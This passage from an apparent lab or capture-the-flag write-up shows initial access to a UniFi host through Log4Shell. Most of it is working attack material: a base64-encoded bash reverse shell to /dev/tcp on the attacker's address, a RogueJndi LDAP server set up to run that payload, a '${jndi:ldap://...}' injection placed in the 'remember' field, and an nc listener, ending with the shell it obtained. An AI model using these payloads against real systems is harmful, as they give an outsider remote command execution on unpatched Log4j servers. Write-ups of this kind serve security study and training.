## 3. Initial Access

### Preparing the Attack Infrastructure

First, confirm the VPN interface address so the target can call back:

```bash
ip a | grep tun0
```

Next, stand up an LDAP server capable of responding to JNDI lookups. I used the open-source **RogueJndi** project, which is purpose-built for researching Log4Shell in a lab environment:

```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

The reverse shell command needs to be base64-encoded before being embedded in the JNDI payload:

```bash
echo -n 'bash -c "bash -i >& /dev/tcp/10.10.14.49/4444 0>&1"' | base64
# YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40OS80NDQ0IDA+JjEi
```

Then launch RogueJndi with a command that decodes and executes that payload:

```bash
java -jar rogue-jndi/target/RogueJndi-1.1.jar \
  --command "bash -c {echo,YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40OS80NDQ0IDA+JjEi}|{base64,-d}|{bash,-i}" \
  --hostname "10.10.14.49"
```

And a listener to catch the callback:

```bash
nc -lvnp 4444
```

### Triggering the Vulnerability

In Burp Suite Repeater, I replaced the `remember` field value with a JNDI reference pointing at my LDAP server:

```json
"remember": "${jndi:ldap://10.10.14.49:1389/o=tomcat}"
```

When the request was sent, the vulnerable Log4j component evaluated the expression instead of treating it as a literal string, triggering an outbound LDAP lookup to my server — which in turn caused the target to execute the embedded command.

A callback on the listener confirmed success:

```
unifi@unified:/usr/lib/unifi$
```

The shell displayed the usual signs of a non-interactive TTY (`cannot set terminal process group`, `no job control in this shell`), but it was fully functional for further enumeration.

